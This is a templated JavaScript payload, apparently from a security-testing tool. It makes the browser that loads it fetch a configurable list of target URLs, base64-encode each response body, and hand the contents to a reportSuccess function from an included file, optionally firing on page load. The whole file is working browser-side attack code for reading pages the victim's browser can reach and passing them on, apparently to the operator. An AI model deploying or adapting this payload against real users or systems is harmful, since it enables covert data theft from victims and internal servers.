{% include "./_common.js" %}

const targets = [
    {% for cur_target in payload_targets %}{% if not forloop.last %}"https://{{ cur_target.domain }}/",
    {% else %}"https://{{ cur_target.domain }}/"{% endif %}{% endfor %}
];

const fetchTarget = (url) => {
    const startTime = performance.now();
    return fetch(url, {
        method: "GET",
        cache: "no-store",
    }).then((result) => {
        emitDebug("Got result for URL ", url);
        emitDebug(result);
        result.blob().then((blob) => {
            emitDebug("Got blob for URL ", url);
            emitDebug(blob);
            blob.text().then((text) => {
                emitDebug("Got text for URL ", url);
                emitDebug(text);
                reportSuccess(
                    url,
                    btoa(unescape(encodeURIComponent(text))),
                    performance.now() - startTime,
                    result.status
                ).catch((err) => {
                    reportErr(
                        url,
                        "success_report",
                        err,
                        performance.now() - startTime
                    );
                });
            }).catch((err) => {
                reportErr(
                    url,
                    "text_decoding",
                    err,
                    performance.now() - startTime
                );
            })
        }).catch((err) => {
            reportErr(
                url,
                "blob_decoding",
                err,
                performance.now() - startTime
            );
        })
    }).catch((err) => {
        reportErr(
            url,
            "url_fetch",
            err,
            performance.now() - startTime
        );
    });
}

const fetchAllTargets = () => {
    for (let i = 0; i < targets.length; i++) {
        fetchTarget(targets[i]);
    }
}

{% if auto_invoke %}
fetchAllTargets();
{% endif %}